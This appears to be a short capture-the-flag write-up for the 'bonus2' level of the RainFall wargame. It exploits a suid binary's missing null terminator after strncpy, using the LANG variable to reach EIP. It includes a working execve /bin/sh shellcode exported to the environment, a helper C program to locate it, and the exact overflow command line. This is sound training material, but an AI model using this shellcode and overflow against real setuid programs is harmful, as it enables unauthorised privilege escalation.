Once we are logged as bonus2

We are presented with a suid binary.

After analysing the binary it seems that it check for env variable and compare with memcpy to check
For language to use (fi or nl or eng for default) to greet the user

It's takes two arguments. And uses strncpy to copy them. We can use this to copy the string without the '\0',
And reproduce a bufferOverflow then overwrite the eip

While using the default language to call the greet function it doesn't give us enough size to overwrite the whole eip address

After trying the other languages we found that "fi" has enough size to do so.

Let's get the shell.

First we will set the language and export a shellcode to our env variables and get it's stack address with this program.
bonus2@RainFall:~$ export LANG='fi'
bonus2@RainFall:~$ export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
bonus2@RainFall:~$ cat > /tmp/getv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	printf("%s is at %p\n", argv[1], getenv(argv[1]));
}


Then we will reproduce a buffer overflow in strncpy with this command to overwrite the eip with address of env SHELLCODE that
we got.
bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xb4\xf8\xff\xbf"')
